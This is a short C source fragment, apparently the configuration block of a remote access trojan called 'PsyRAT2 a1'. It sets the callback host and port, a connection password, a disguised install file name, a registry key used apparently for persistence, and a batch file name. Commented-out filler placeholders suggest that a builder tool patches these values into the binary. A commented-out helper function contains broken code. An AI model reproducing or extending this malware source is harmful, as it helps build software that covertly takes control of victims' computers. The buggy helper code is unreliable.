#define USE_PASSWORD


unsigned const char version[32] = "PsyRAT2 a1";
/*unsigned const char dns[32] = "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%";
unsigned const char szport[5] = "@@@@@";
unsigned const char password[25] = "*************************";
unsigned const char installname[25] = "#########################";
unsigned const char regkey[32] = "^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^";
unsigned const char batname[25] = "$$$$$$$$$$$$$$$$$$$$$$$$$";*/
/*unsigned const char dns[32] = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
unsigned const char szport[5] = "\0\0\0\0\0";
unsigned const char password[25] = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
unsigned const char installname[25] = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
unsigned const char regkey[32] = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
unsigned const char batname[25] = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";*/

unsigned const char dns[32] = "localhost";
//unsigned const char szport[5] = "9863";
unsigned const char szport[5] = "10399";
//unsigned const char password[25] = "asdf";
unsigned const char password[25] = "qazwsx";
unsigned const char installname[25] = "poopshmoo.exe";
unsigned const char regkey[32] = "POOPSHMOOLAMER";
unsigned const char batname[25] = "poop41432.bat";

char infoBuf[1024],boxname[128];
/*void strip_spaces (char s[], char out[]) {
	int i;
	if (i = strchr(s," ")) {
		printf(i);
		if ((lstrlen(out) >= i-1)) {
			printf("a");
			strncpy(out,s,i-1);
		} else strcpy(out,s);
	} else strcpy(out,s);
}*/
